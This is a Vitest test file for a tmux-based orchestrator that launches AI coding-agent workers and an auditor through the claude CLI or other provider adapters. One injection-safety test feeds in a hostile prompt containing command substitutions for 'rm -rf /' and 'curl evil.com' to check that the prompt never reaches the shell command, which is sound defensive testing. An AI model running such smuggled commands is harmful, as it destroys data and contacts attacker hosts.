import { describe, it, expect, vi, beforeEach } from 'vitest';
import {
  isSessionActive,
  ensureSession,
  spawnWorker,
  killWorker,
  listWorkers,
  startAuditor,
  attach,
  destroy,
  sendKeys,
  createWatchLayout,
  attachToWorkerPane,
  cleanupPromptFile,
  buildWorkerCommand,
  buildClaudeCommand,
  WORKER_TIMEOUT_SECONDS,
  TmuxError,
} from '../../src/orchestra/tmux.js';
import type { ProviderAdapter } from '../../src/core/provider.js';
import type { ModelType } from '../../src/core/types.js';

vi.mock('node:child_process', () => ({
  spawnSync: vi.fn(),
}));

vi.mock('node:fs', () => ({
  writeFileSync: vi.fn(),
  unlinkSync: vi.fn(),
  mkdirSync: vi.fn(),
  existsSync: vi.fn(() => true),
}));

vi.mock('node:crypto', () => ({
  randomBytes: vi.fn(() => ({ toString: () => 'abcdef01' })),
}));

import { spawnSync } from 'node:child_process';
import { existsSync } from 'node:fs';

const mockedSpawnSync = vi.mocked(spawnSync);
const mockedExistsSync = vi.mocked(existsSync);

beforeEach(() => {
  vi.clearAllMocks();
  mockedExistsSync.mockReturnValue(true);
});

const isWindows = process.platform === 'win32';

describe.skipIf(isWindows)('isSessionActive', () => {
  it('returns true when session exists (status=0)', () => {
    mockedSpawnSync.mockReturnValue({
      status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
    } as never);

    expect(isSessionActive()).toBe(true);
    expect(mockedSpawnSync).toHaveBeenCalledWith(
      'tmux', ['has-session', '-t', 'deckent'],
      expect.objectContaining({ encoding: 'utf-8' }),
    );
  });

  it('returns false when session does not exist (status≠0)', () => {
    mockedSpawnSync.mockReturnValue({
      status: 1, stdout: '', stderr: 'no session', pid: 1, signal: null, output: [],
    } as never);

    expect(isSessionActive()).toBe(false);
  });
});

describe.skipIf(isWindows)('ensureSession', () => {
  it('creates session when none exists', () => {
    // First call: has-session → fail
    mockedSpawnSync.mockReturnValueOnce({
      status: 1, stdout: '', stderr: 'no session', pid: 1, signal: null, output: [],
    } as never);
    // Second call: new-session → success
    mockedSpawnSync.mockReturnValueOnce({
      status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
    } as never);

    ensureSession();

    expect(mockedSpawnSync).toHaveBeenCalledTimes(2);
    expect(mockedSpawnSync).toHaveBeenNthCalledWith(
      2, 'tmux', ['new-session', '-d', '-s', 'deckent'],
      expect.objectContaining({ encoding: 'utf-8' }),
    );
  });

  it('is no-op when session already exists', () => {
    mockedSpawnSync.mockReturnValue({
      status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
    } as never);

    ensureSession();

    // Only has-session check, no new-session
    expect(mockedSpawnSync).toHaveBeenCalledTimes(1);
    expect(mockedSpawnSync).toHaveBeenCalledWith(
      'tmux', ['has-session', '-t', 'deckent'],
      expect.objectContaining({ encoding: 'utf-8' }),
    );
  });
});

describe.skipIf(isWindows)('spawnWorker', () => {
  it('opens window and sends claude command via tmpfile', () => {
    mockedSpawnSync.mockReturnValue({
      status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
    } as never);

    spawnWorker('task-001', 'sonnet', 'build the feature', '/project');

    expect(mockedSpawnSync).toHaveBeenCalledTimes(3);
    // new-window
    expect(mockedSpawnSync).toHaveBeenNthCalledWith(
      1, 'tmux',
      ['new-window', '-t', 'deckent', '-n', 'w-task-001', '-c', '/project'],
      expect.objectContaining({ encoding: 'utf-8' }),
    );
    // send-keys — command should reference tmpfile, not inline prompt
    const sendKeysCall = mockedSpawnSync.mock.calls[1];
    const args = sendKeysCall![1] as string[];
    expect(args).toContain('send-keys');
    expect(args).toContain('-t');
    expect(args).toContain('deckent:w-task-001');
    const cmdArg = args.find((a) => a.includes('claude'));
    expect(cmdArg).toBeDefined();
    expect(cmdArg).toContain('claude -p - --model sonnet');
    expect(cmdArg).toContain('.prompt-abcdef01.txt');
  });

  it('prompt content is written to file, not embedded in command (injection-safe)', () => {
    mockedSpawnSync.mockReturnValue({
      status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
    } as never);

    const dangerousPrompt = "$(rm -rf /); `curl evil.com`; ${PATH}";
    spawnWorker('task-002', 'opus', dangerousPrompt, '/project');

    // The command string should NOT contain the prompt text
    const sendKeysCall = mockedSpawnSync.mock.calls[1];
    const args = sendKeysCall![1] as string[];
    const cmdArg = args.find((a) => a.includes('claude'));
    expect(cmdArg).not.toContain('rm -rf');
    expect(cmdArg).not.toContain('curl evil.com');
    expect(cmdArg).not.toContain('${PATH}');
    // It should use stdin redirect from file
    expect(cmdArg).toContain('< /project/.tasks/.prompt-abcdef01.txt');
  });

  it('adds --allowedTools when opts.allowedTools is set', () => {
    mockedSpawnSync.mockReturnValue({
      status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
    } as never);

    spawnWorker('task-003', 'sonnet', 'do work', '/project', {
      allowedTools: 'Read,Write,Bash',
    });

    const sendKeysCall = mockedSpawnSync.mock.calls[1];
    const args = sendKeysCall![1] as string[];
    const cmdArg = args.find((a) => a.includes('--allowedTools'));
    expect(cmdArg).toBeDefined();
    expect(cmdArg).toContain('Read,Write,Bash');
  });

  it('adds --dangerously-skip-permissions when autoApprove is true', () => {
    mockedSpawnSync.mockReturnValue({
      status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
    } as never);

    spawnWorker('task-004', 'haiku', 'quick task', '/project', {
      autoApprove: true,
    });

    const sendKeysCall = mockedSpawnSync.mock.calls[1];
    const args = sendKeysCall![1] as string[];
    const cmdArg = args.find((a) => a.includes('--dangerously-skip-permissions'));
    expect(cmdArg).toBeDefined();
  });

  it('calls pipe-pane to capture worker output to log file', () => {
    mockedSpawnSync.mockReturnValue({
      status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
    } as never);

    spawnWorker('task-010', 'sonnet', 'do work', '/project');

    // 3 calls: new-window + send-keys + pipe-pane
    expect(mockedSpawnSync).toHaveBeenCalledTimes(3);
    expect(mockedSpawnSync).toHaveBeenNthCalledWith(
      3, 'tmux',
      ['pipe-pane', '-t', 'deckent:w-task-010', '-o', 'cat >> /project/.tasks/task-task-010.log'],
      expect.objectContaining({ encoding: 'utf-8' }),
    );
  });

  it('uses stdin redirect instead of inline prompt', () => {
    mockedSpawnSync.mockReturnValue({
      status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
    } as never);

    spawnWorker('task-005', 'sonnet', 'simple task', '/project');

    const sendKeysCall = mockedSpawnSync.mock.calls[1];
    const args = sendKeysCall![1] as string[];
    const cmdArg = args.find((a) => a.includes('claude'));
    expect(cmdArg).toBeDefined();
    expect(cmdArg).toContain('--model sonnet');
    expect(cmdArg).toContain('-p -');
    expect(cmdArg).toContain('< ');
    expect(cmdArg).not.toContain('--allowedTools');
    expect(cmdArg).not.toContain('--dangerously-skip-permissions');
  });
});

describe.skipIf(isWindows)('killWorker', () => {
  it('kills the correct window', () => {
    mockedSpawnSync.mockReturnValue({
      status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
    } as never);

    killWorker('task-001');

    expect(mockedSpawnSync).toHaveBeenCalledWith(
      'tmux', ['kill-window', '-t', 'deckent:w-task-001'],
      expect.objectContaining({ encoding: 'utf-8' }),
    );
  });

  it('throws TmuxError when window does not exist', () => {
    mockedSpawnSync.mockReturnValue({
      status: 1, stdout: '', stderr: 'no such window', pid: 1, signal: null, output: [],
    } as never);

    expect(() => killWorker('nonexistent')).toThrow(TmuxError);
  });
});

describe.skipIf(isWindows)('listWorkers', () => {
  it('parses taskIds with w- prefix stripped, non-workers filtered', () => {
    mockedSpawnSync.mockReturnValue({
      status: 0,
      stdout: 'brain\nauditor\nw-task-001\nw-task-002\n',
      stderr: '', pid: 1, signal: null, output: [],
    } as never);

    const workers = listWorkers();
    expect(workers).toEqual(['task-001', 'task-002']);
  });

  it('returns empty array when session does not exist', () => {
    mockedSpawnSync.mockReturnValue({
      status: 1, stdout: '', stderr: 'no session', pid: 1, signal: null, output: [],
    } as never);

    expect(listWorkers()).toEqual([]);
  });
});

describe.skipIf(isWindows)('startAuditor', () => {
  it('creates auditor window with sonnet model when not already running', () => {
    mockedSpawnSync.mockReturnValue({
      status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
    } as never);

    startAuditor('/project');

    // 3 calls: list-windows (existence check) + new-window + send-keys
    expect(mockedSpawnSync).toHaveBeenCalledTimes(3);
    // list-windows check
    expect(mockedSpawnSync).toHaveBeenNthCalledWith(
      1, 'tmux',
      ['list-windows', '-t', 'deckent', '-F', '#{window_name}'],
      expect.objectContaining({ encoding: 'utf-8' }),
    );
    // new-window with name "auditor"
    expect(mockedSpawnSync).toHaveBeenNthCalledWith(
      2, 'tmux',
      ['new-window', '-t', 'deckent', '-n', 'auditor', '-c', '/project'],
      expect.objectContaining({ encoding: 'utf-8' }),
    );
    // send-keys with --model sonnet
    const sendKeysArgs = mockedSpawnSync.mock.calls[2]![1] as string[];
    const cmdArg = sendKeysArgs.find((a) => a.includes('claude'));
    expect(cmdArg).toContain('--model sonnet');
  });

  it('skips new-window when auditor window already exists', () => {
    // list-windows returns "auditor" in the output
    mockedSpawnSync.mockImplementation((_cmd, args) => {
      const argsArr = args as string[];
      if (argsArr[0] === 'list-windows') {
        return { status: 0, stdout: 'brain\nauditor\n', stderr: '', pid: 1, signal: null, output: [] } as never;
      }
      return { status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [] } as never;
    });

    startAuditor('/project');

    // 2 calls only: list-windows (exists → skip new-window) + send-keys
    expect(mockedSpawnSync).toHaveBeenCalledTimes(2);
    // No new-window call
    const allArgs = mockedSpawnSync.mock.calls.map(c => (c[1] as string[])[0]);
    expect(allArgs).not.toContain('new-window');
  });

  it('passes allowedTools from opts', () => {
    mockedSpawnSync.mockReturnValue({
      status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
    } as never);

    startAuditor('/project', {
      allowedTools: 'Read,Write(.dashboard),Bash(git diff *)',
    });

    // send-keys is now the 3rd call (after list-windows + new-window)
    const sendKeysArgs = mockedSpawnSync.mock.calls[2]![1] as string[];
    const cmdArg = sendKeysArgs.find((a) => a.includes('--allowedTools'));
    expect(cmdArg).toBeDefined();
  });
});

describe.skipIf(isWindows)('destroy', () => {
  it('kills the session', () => {
    mockedSpawnSync.mockReturnValue({
      status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
    } as never);

    destroy();

    expect(mockedSpawnSync).toHaveBeenCalledWith(
      'tmux', ['kill-session', '-t', 'deckent'],
      expect.objectContaining({ encoding: 'utf-8' }),
    );
  });

  it('does not throw when session does not exist', () => {
    mockedSpawnSync.mockReturnValue({
      status: 1, stdout: '', stderr: 'no session', pid: 1, signal: null, output: [],
    } as never);

    expect(() => destroy()).not.toThrow();
  });
});

describe.skipIf(isWindows)('sendKeys', () => {
  it('sends correct target and keys', () => {
    mockedSpawnSync.mockReturnValue({
      status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
    } as never);

    sendKeys('brain', 'ls -la');

    expect(mockedSpawnSync).toHaveBeenCalledWith(
      'tmux',
      ['send-keys', '-t', 'deckent:brain', 'ls -la', 'Enter'],
      expect.objectContaining({ encoding: 'utf-8' }),
    );
  });
});

describe.skipIf(isWindows)('cleanupPromptFile', () => {
  it('calls unlinkSync on the given path', () => {
    cleanupPromptFile('/tmp/prompt.txt');
    // No throw means success
  });
});

describe.skipIf(isWindows)('attach', () => {
  it('uses stdio inherit for blocking attach', () => {
    mockedSpawnSync.mockReturnValue({
      status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
    } as never);

    attach();

    expect(mockedSpawnSync).toHaveBeenCalledWith(
      'tmux', ['attach', '-t', 'deckent'],
      expect.objectContaining({ stdio: 'inherit' }),
    );
  });
});

describe.skipIf(isWindows)('createWatchLayout', () => {
  it('creates a watch window and splits it when window does not exist', () => {
    mockedSpawnSync.mockImplementation((_cmd, args) => {
      const argsArr = args as string[];
      if (argsArr[0] === 'list-windows') {
        return { status: 0, stdout: 'brain\nauditor\n', stderr: '', pid: 1, signal: null, output: [] } as never;
      }
      return { status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [] } as never;
    });

    createWatchLayout('/project');

    // Calls: list-windows (windowExists) + new-window (run) + split-window + select-window + attach-session
    const allCmds = mockedSpawnSync.mock.calls.map(c => (c[1] as string[])[0]);
    expect(allCmds).toContain('list-windows');
    expect(allCmds).toContain('new-window');
    expect(allCmds).toContain('split-window');
    expect(allCmds).toContain('select-window');
    expect(allCmds).toContain('attach-session');
  });

  it('skips window creation when watch window already exists', () => {
    mockedSpawnSync.mockImplementation((_cmd, args) => {
      const argsArr = args as string[];
      if (argsArr[0] === 'list-windows') {
        return { status: 0, stdout: 'brain\nwatch\n', stderr: '', pid: 1, signal: null, output: [] } as never;
      }
      return { status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [] } as never;
    });

    createWatchLayout('/project');

    const allCmds = mockedSpawnSync.mock.calls.map(c => (c[1] as string[])[0]);
    expect(allCmds).not.toContain('new-window');
    expect(allCmds).not.toContain('split-window');
    expect(allCmds).toContain('select-window');
    expect(allCmds).toContain('attach-session');
  });

  it('uses stdio inherit for attach-session', () => {
    mockedSpawnSync.mockReturnValue({
      status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
    } as never);

    createWatchLayout('/project');

    const attachCall = mockedSpawnSync.mock.calls.find(
      c => (c[1] as string[])[0] === 'attach-session',
    );
    expect(attachCall).toBeDefined();
    expect(attachCall![2]).toEqual(expect.objectContaining({ stdio: 'inherit' }));
  });
});

describe.skipIf(isWindows)('attachToWorkerPane', () => {
  it('selects the correct worker window and attaches', () => {
    mockedSpawnSync.mockImplementation((_cmd, args) => {
      const argsArr = args as string[];
      if (argsArr[0] === 'list-windows') {
        return { status: 0, stdout: 'brain\nw-016-001\nauditor\n', stderr: '', pid: 1, signal: null, output: [] } as never;
      }
      return { status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [] } as never;
    });

    attachToWorkerPane('016-001');

    const selectCall = mockedSpawnSync.mock.calls.find(
      c => (c[1] as string[])[0] === 'select-window',
    );
    expect(selectCall).toBeDefined();
    expect((selectCall![1] as string[])[2]).toBe('deckent:w-016-001');

    const attachCall = mockedSpawnSync.mock.calls.find(
      c => (c[1] as string[])[0] === 'attach-session',
    );
    expect(attachCall).toBeDefined();
  });

  it('throws TmuxError when worker window does not exist', () => {
    mockedSpawnSync.mockImplementation((_cmd, args) => {
      const argsArr = args as string[];
      if (argsArr[0] === 'list-windows') {
        return { status: 0, stdout: 'brain\nauditor\n', stderr: '', pid: 1, signal: null, output: [] } as never;
      }
      return { status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [] } as never;
    });

    expect(() => attachToWorkerPane('999-001')).toThrow(TmuxError);
    expect(() => attachToWorkerPane('999-001')).toThrow('Worker window w-999-001 not found');
  });
});

// ─── buildWorkerCommand + Provider Decoupling Tests ─────────────────

function createMockAdapter(overrides?: Partial<ProviderAdapter>): ProviderAdapter {
  return {
    name: 'mock-provider',
    supportedModels: ['opus', 'sonnet', 'haiku'] as readonly ModelType[],
    spawn: vi.fn(),
    kill: vi.fn(),
    listWorkers: vi.fn(() => []),
    isAvailable: vi.fn(async () => true),
    buildCommand: vi.fn(
      (model: ModelType, promptPath: string, _opts?: { allowedTools?: string; autoApprove?: boolean }) =>
        `mock-cli --model ${model} < ${promptPath}`,
    ),
    ...overrides,
  };
}

describe.skipIf(isWindows)('buildWorkerCommand', () => {
  it('produces Claude CLI command without adapter (backward compat)', () => {
    const cmd = buildWorkerCommand('sonnet', '/tmp/prompt.txt');
    expect(cmd).toBe('claude -p - --model sonnet < /tmp/prompt.txt');
  });

  it('includes --allowedTools when opts provided (no adapter)', () => {
    const cmd = buildWorkerCommand('opus', '/tmp/p.txt', { allowedTools: 'Read,Write' });
    expect(cmd).toContain("--allowedTools 'Read,Write'");
    expect(cmd).toContain('claude -p - --model opus');
  });

  it('includes --dangerously-skip-permissions when autoApprove (no adapter)', () => {
    const cmd = buildWorkerCommand('haiku', '/tmp/p.txt', { autoApprove: true });
    expect(cmd).toContain('--dangerously-skip-permissions');
  });

  it('includes both opts flags together (no adapter)', () => {
    const cmd = buildWorkerCommand('sonnet', '/tmp/p.txt', {
      allowedTools: 'Bash',
      autoApprove: true,
    });
    expect(cmd).toContain("--allowedTools 'Bash'");
    expect(cmd).toContain('--dangerously-skip-permissions');
    expect(cmd).toContain('< /tmp/p.txt');
  });

  it('delegates to adapter.buildCommand when adapter is provided', () => {
    const adapter = createMockAdapter();
    const cmd = buildWorkerCommand('opus', '/tmp/p.txt', undefined, adapter);
    expect(adapter.buildCommand).toHaveBeenCalledWith('opus', '/tmp/p.txt', {
      allowedTools: undefined,
      autoApprove: undefined,
    });
    expect(cmd).toBe('mock-cli --model opus < /tmp/p.txt');
  });

  it('passes opts to adapter.buildCommand correctly', () => {
    const adapter = createMockAdapter();
    buildWorkerCommand('sonnet', '/tmp/p.txt', { allowedTools: 'Read', autoApprove: true }, adapter);
    expect(adapter.buildCommand).toHaveBeenCalledWith('sonnet', '/tmp/p.txt', {
      allowedTools: 'Read',
      autoApprove: true,
    });
  });

  it('uses adapter output verbatim (does not append Claude flags)', () => {
    const adapter = createMockAdapter({
      buildCommand: vi.fn(() => 'custom-cli run --fast'),
    });
    const cmd = buildWorkerCommand('opus', '/tmp/p.txt', { allowedTools: 'Read' }, adapter);
    expect(cmd).toBe('custom-cli run --fast');
    expect(cmd).not.toContain('claude');
    expect(cmd).not.toContain('--allowedTools');
  });

  it('wraps with timeout when taskId is provided (no adapter)', () => {
    const cmd = buildWorkerCommand('opus', '/proj/.tasks/.prompt-abc.txt', undefined, undefined, '001-001');
    expect(cmd).toContain(`timeout ${WORKER_TIMEOUT_SECONDS}`);
    expect(cmd).toContain('WORKER_TIMEOUT');
    expect(cmd).toContain('task-001-001.timeout');
    expect(cmd).toContain('claude -p - --model opus');
  });

  it('does not wrap timeout when taskId is not provided (backward compat)', () => {
    const cmd = buildWorkerCommand('sonnet', '/tmp/prompt.txt');
    expect(cmd).not.toContain('timeout');
    expect(cmd).not.toContain('WORKER_TIMEOUT');
    expect(cmd).toBe('claude -p - --model sonnet < /tmp/prompt.txt');
  });

  it('uses custom timeout seconds when provided', () => {
    const cmd = buildWorkerCommand('haiku', '/proj/.tasks/.prompt-x.txt', undefined, undefined, '002-001', 600);
    expect(cmd).toContain('timeout 600');
    expect(cmd).toContain('task-002-001.timeout');
  });

  it('does not wrap timeout when adapter is provided', () => {
    const adapter = createMockAdapter();
    const cmd = buildWorkerCommand('opus', '/tmp/p.txt', undefined, adapter, '001-001');
    expect(cmd).not.toContain('timeout');
    expect(cmd).toBe('mock-cli --model opus < /tmp/p.txt');
  });

  it('does not wrap timeout when timeoutSeconds is 0', () => {
    const cmd = buildWorkerCommand('sonnet', '/proj/.tasks/.prompt-z.txt', undefined, undefined, '003-001', 0);
    expect(cmd).not.toContain('timeout');
    expect(cmd).toContain('claude -p - --model sonnet');
  });

  it('WORKER_TIMEOUT_SECONDS has the expected default value', () => {
    expect(WORKER_TIMEOUT_SECONDS).toBe(1200);
  });
});

describe.skipIf(isWindows)('buildClaudeCommand alias', () => {
  it('is the same function reference as buildWorkerCommand', () => {
    expect(buildClaudeCommand).toBe(buildWorkerCommand);
  });

  it('produces identical output to buildWorkerCommand', () => {
    const a = buildClaudeCommand('opus', '/tmp/p.txt', { allowedTools: 'Bash' });
    const b = buildWorkerCommand('opus', '/tmp/p.txt', { allowedTools: 'Bash' });
    expect(a).toBe(b);
  });
});

describe.skipIf(isWindows)('spawnWorker with adapter', () => {
  it('uses adapter command when adapter is provided', () => {
    mockedSpawnSync.mockReturnValue({
      status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
    } as never);

    const adapter = createMockAdapter({
      buildCommand: vi.fn(() => 'codex --model o3-mini < /project/.tasks/.prompt-abcdef01.txt'),
    });

    spawnWorker('task-100', 'opus', 'do work', '/project', undefined, adapter);

    // send-keys call should contain the adapter's command, not claude
    const sendKeysCall = mockedSpawnSync.mock.calls[1];
    const args = sendKeysCall![1] as string[];
    const cmdArg = args.find((a) => a.includes('codex'));
    expect(cmdArg).toBeDefined();
    expect(cmdArg).toContain('codex --model o3-mini');
    expect(cmdArg).not.toContain('claude');
  });

  it('uses Claude default when no adapter is provided', () => {
    mockedSpawnSync.mockReturnValue({
      status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
    } as never);

    spawnWorker('task-101', 'sonnet', 'do work', '/project');

    const sendKeysCall = mockedSpawnSync.mock.calls[1];
    const args = sendKeysCall![1] as string[];
    const cmdArg = args.find((a) => a.includes('claude'));
    expect(cmdArg).toBeDefined();
    expect(cmdArg).toContain('claude -p - --model sonnet');
  });
});

describe.skipIf(isWindows)('startAuditor with adapter', () => {
  it('uses adapter command when adapter is provided', () => {
    mockedSpawnSync.mockReturnValue({
      status: 0, stdout: '', stderr: '', pid: 1, signal: null, output: [],
    } as never);

    const adapter = createMockAdapter({
      buildCommand: vi.fn(() => 'gemini-cli --model gemini-pro < /project/.tasks/.prompt-abcdef01.txt'),
    });

    startAuditor('/project', undefined, adapter);

    // send-keys is 3rd call (list-windows + new-window + send-keys)
    const sendKeysArgs = mockedSpawnSync.mock.calls[2]![1] as string[];
    const cmdArg = sendKeysArgs.find((a) => a.includes('gemini-cli'));
    expect(cmdArg).toBeDefined();
    expect(cmdArg).not.toContain('claude');
  });
});
